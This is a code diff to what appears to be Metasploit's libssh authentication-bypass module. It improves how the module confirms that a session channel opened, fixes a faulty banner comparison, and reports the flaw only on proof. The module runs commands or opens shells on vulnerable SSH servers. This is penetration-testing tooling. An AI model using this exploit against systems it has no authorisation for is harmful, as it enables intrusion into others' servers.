@@ -12,6 +12,32 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Sessions::CreateSessionOptions
   include Msf::Auxiliary::ReportSummary
 
+  # A request response, even a refusal, proves the session channel was opened.
+  class ProofCommandStream < Net::SSH::CommandStream
+    attr_reader :channel_opened
+
+    def initialize(ssh, cmd = nil, **options)
+      @ready = Queue.new
+      super
+    end
+
+    def shell_requested(channel, success)
+      @channel_opened = true
+      super
+    ensure
+      @ready << nil
+    end
+
+    def handle_error(error: nil)
+      @ready << error
+      super
+    end
+
+    def wait_ready
+      @ready.pop
+    end
+  end
+
   def initialize(info = {})
     super(
       update_info(
@@ -69,15 +95,15 @@ class MetasploitModule < Msf::Auxiliary
 
   # Vulnerable since 0.6.0 and patched in 0.7.6 and 0.8.4
   def check_banner(ip, version)
-    version =~ /libssh[_-]?([\d.]*)$/ && $1 && (v = Rex::Version.new($1))
+    banner = version.match(/libssh[_-]?([\d.]*)$/)
 
-    if v.nil?
+    if banner.nil?
       vprint_error("#{ip}:#{rport} - #{version} does not appear to be libssh")
       Exploit::CheckCode::Unknown("#{version} does not appear to be libssh")
-    elsif v.to_s.empty?
+    elsif banner[1].empty?
       vprint_warning("#{ip}:#{rport} - libssh version not reported")
       Exploit::CheckCode::Detected('libssh detected but version not reported')
-    elsif v.between?(Rex::Version.new('0.6.0'), Rex::Version.new('0.7.5')) ||
+    elsif (v = Rex::Version.new(banner[1])).between?(Rex::Version.new('0.6.0'), Rex::Version.new('0.7.5')) ||
           v.between?(Rex::Version.new('0.8.0'), Rex::Version.new('0.8.3'))
       vprint_good("#{ip}:#{rport} - #{version} appears to be unpatched")
       Exploit::CheckCode::Appears("#{version} appears to be unpatched")
@@ -116,21 +142,16 @@ class MetasploitModule < Msf::Auxiliary
 
     version = ssh.transport.server_version.version
 
-    # XXX: The OOB authentication leads to false positives, so check banner
+    # The local bypass auth method alone is not proof; require a session channel.
     if datastore['CHECK_BANNER']
-      return if check_banner(ip, version) !=
-                (Exploit::CheckCode::Appears || Exploit::CheckCode::Detected)
+      banner_result = check_banner(ip, version)
+      return unless [Exploit::CheckCode::Appears, Exploit::CheckCode::Detected].include?(banner_result)
     end
 
-    report_vuln(
-      host: ip,
-      name: self.name,
-      refs: self.references,
-      info: version
-    )
-
     if action.name == 'Execute'
-      output = execute_command(ssh)
+      result = execute_command(ssh)
+      report_bypass(ip, version) if result[:channel_opened]
+      output = result[:output]
       return if output.nil?
 
       print_status("Attempting #{action.name.inspect} Action, see \"show actions\" for more details")
@@ -143,12 +164,21 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    shell = Net::SSH::CommandStream.new(ssh, datastore['CMD'], pty: datastore['SPAWN_PTY'], logger: self)
+    shell = ProofCommandStream.new(ssh, datastore['CMD'], pty: datastore['SPAWN_PTY'], logger: self)
 
-    # XXX: Wait for CommandStream to log a channel request failure
-    sleep 0.1
+    timed_out = false
+    begin
+      ready_error = ::Timeout.timeout(datastore['SSH_TIMEOUT']) { shell.wait_ready }
+    rescue ::Timeout::Error => e
+      print_error('SSH shell channel request timed out')
+      elog('SSH shell channel request timed out', error: e)
+      timed_out = true
+    end
 
-    if (e = shell.error)
+    report_bypass(ip, version) if shell.channel_opened
+    return if timed_out
+
+    if (e = ready_error || shell.error)
       print_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
       return
     end
@@ -171,10 +201,26 @@ class MetasploitModule < Msf::Auxiliary
 
   private
 
+  def report_bypass(ip, version)
+    service = report_service(host: ip, port: rport, proto: 'tcp', name: 'ssh', info: version)
+    report_vuln(
+      host: ip,
+      port: rport,
+      proto: 'tcp',
+      sname: 'ssh',
+      service: service,
+      name: name,
+      refs: references,
+      info: version
+    )
+  end
+
   def execute_command(ssh)
+    result = { channel_opened: false, output: nil }
     output = String.new
     ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
       channel = ssh.open_channel do |command_channel|
+        result[:channel_opened] = true
         command_channel.request_pty if datastore['SPAWN_PTY']
         command_channel.exec(datastore['CMD']) do |_channel, success|
           raise Net::SSH::ChannelRequestFailed, 'Exec channel request failed' unless success
@@ -184,11 +230,12 @@ class MetasploitModule < Msf::Auxiliary
       # Waiting for channel closure collects delayed and fragmented stdout.
       channel.wait
     end
-    output.chomp
+    result[:output] = output.chomp
+    result
   rescue Net::SSH::Exception, ::Timeout::Error, ::IOError, Errno::ECONNRESET, Errno::EPIPE => e
     print_error("SSH command execution failed: #{e.class}: #{e.message}")
     elog('SSH command execution failed', error: e)
-    nil
+    result
   end
 
   def close_ssh(ssh)
